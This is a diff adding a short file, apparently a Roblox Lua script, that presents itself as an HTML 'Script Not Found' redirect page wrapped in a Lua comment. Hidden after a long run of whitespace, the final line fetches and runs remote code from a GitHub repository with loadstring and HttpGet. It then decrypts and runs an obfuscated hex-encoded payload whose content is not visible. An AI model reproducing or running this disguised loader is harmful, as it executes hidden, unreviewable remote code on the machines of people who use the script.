@@ -1,0 +1,14 @@
+--[[<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; URL='https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Script%20Not%20Found'" />
+    <style>
+      body {
+        background-color: black;
+        margin: 0;
+      }
+    </style>
+  </head>
+  <body></body>
+</html>
+]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Hash%20Code%20Encryptor%20And%20Decryptor"))()loadstring(DecryptHash("162df6cd5621b62669622586131f17962bccfb19068d6cd8fd0e272238ad9cc9967a89d0b2f814844deb3329079e26697466c0c949b5743808ea70d45f961cec").message)()
